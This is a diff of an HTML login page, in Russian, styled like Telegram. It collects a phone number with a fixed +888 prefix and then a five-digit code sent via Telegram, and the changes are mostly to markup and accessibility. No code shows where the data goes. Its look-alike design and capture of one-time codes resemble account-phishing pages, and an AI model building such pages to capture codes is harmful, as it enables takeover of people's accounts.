@@ -22,11 +22,11 @@
     </div>
 
     <!-- Шаг 1: Номер телефона -->
-    <div id="step-phone" class="step">
+    <div id="step-phone" class="step is-active">
       <h1>Номер телефона</h1>
       <p class="sub">Проверьте код страны и введите свой номер телефона.</p>
-      
-      <!-- Блок выбора страны -->
+
+      <!-- Блок выбора страны (декоративный, страна фиксирована) -->
       <div class="country-box">
         <div class="country-flag">🏴‍☠️</div>
         <div class="country-info">
@@ -40,11 +40,12 @@
       <div class="phone-input-wrap">
         <div class="prefix">+888</div>
         <div class="divider-line"></div>
-        <input id="phone" type="tel" inputmode="numeric" autocomplete="off" placeholder="0000 0000">
+        <input id="phone" type="tel" inputmode="numeric" autocomplete="off"
+               placeholder="1234 5678" maxlength="11" aria-label="Номер телефона">
       </div>
 
       <!-- Круглая кнопка продолжения -->
-      <button id="btn-phone" class="tg-fab-btn" aria-label="Далее">
+      <button id="btn-phone" class="tg-fab-btn" aria-label="Далее" disabled>
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
       </button>
 
@@ -52,13 +53,14 @@
     </div>
 
     <!-- Шаг 2: Код подтверждения -->
-    <div id="step-code" class="step hidden">
+    <div id="step-code" class="step">
       <h1>Код из бота</h1>
       <p class="sub">Мы отправили код в Telegram для номера <b id="code-num"></b></p>
-      
-      <div class="code-input-container">
-        <input id="code" class="big-input code" type="text" inputmode="numeric" maxlength="5" autocomplete="one-time-code" placeholder="•••••">
-      </div>
+
+      <!-- Ячейки кода (заполняет JS), скрытый input — буфер для автозаполнения -->
+      <div id="code-cells" class="code-cells" data-len="5"></div>
+      <input id="code" type="text" inputmode="numeric" autocomplete="one-time-code"
+             class="visually-hidden" tabindex="-1" aria-hidden="true">
 
       <div class="auth-actions">
         <button id="resend" class="link" disabled>Отправить код снова</button>
